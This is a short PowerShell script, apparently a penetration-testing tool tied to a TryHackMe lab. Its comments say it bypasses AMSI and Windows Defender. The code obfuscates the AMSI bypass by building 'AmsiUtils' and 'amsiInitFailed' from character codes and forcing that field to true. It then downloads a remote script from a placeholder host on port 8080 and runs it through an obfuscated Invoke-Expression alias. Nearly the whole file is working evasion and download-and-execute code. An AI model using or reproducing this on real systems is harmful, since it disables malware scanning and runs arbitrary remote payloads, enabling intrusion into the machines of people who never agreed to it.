#Execute your .ps1 shell via IEX, bypass AMSI & Windows Defender.
#Tested on updated W10 systems and was used to finish THM's Network "Wreath"
#Author: 0iphor13

Start-Sleep -s 3

[Delegate]::CreateDelegate(("Func``3[String, $(([String].Assembly.GetType('System.Reflection.BindingFlags')).FullName), System.Reflection.FieldInfo]" -as [String].Assembly.GetType('System.Type')), [Object]([Ref].Assembly.GetType("System.Management.Automation.$([Char]([byTE]0x41)+[Char]([bytE]0x6D)+[Char](136-21)+[CHAR]([bYTe]0x69)+[char](85)+[CHAr]([bYTe]0x74)+[CHaR]([BYTE]0x69)+[CHAR]([BytE]0x6C)+[CHAr]([byTE]0x73))")),($([chAR]([bYte]0x47)+[CHAr]([ByTe]0x65)+[chAR](120-4)+[CHar]([bytE]0x46)+[CHAR]([bYTE]0x69)+[CHAR]([BYTe]0x65)+[cHAr]([ByTE]0x6C)+[chAr](6500/65)))).Invoke(''+$([ChAr]([bYtE]0x61)+[chAr](149-40)+[cHaR]([bYTE]0x73)+[cHAr]([bYtE]0x69)+[CHAr]([byTe]0x49)+[cHaR](4620/42)+[CHar](105)+[CHAR]([byTe]0x74)+[chAr]([ByTE]0x46)+[chaR]([BYTe]0x61)+[cHar]([bYTe]0x69)+[ChaR]([bYTe]0x6C)+[chAR]([BYte]0x65)+[CHaR](100))+'',(("NonPublic,Static") -as [String].Assembly.GetType('System.Reflection.BindingFlags'))).SetValue($null,$True);

Start-Sleep 1

(New-Object Net.WebClient).DownloadString('http://0.0.0.0:8080/Invoke-Program.ps1') | & ( $eNV:ComSpeC[4,15,25]-JoIn'' )

Start-Sleep -s 60

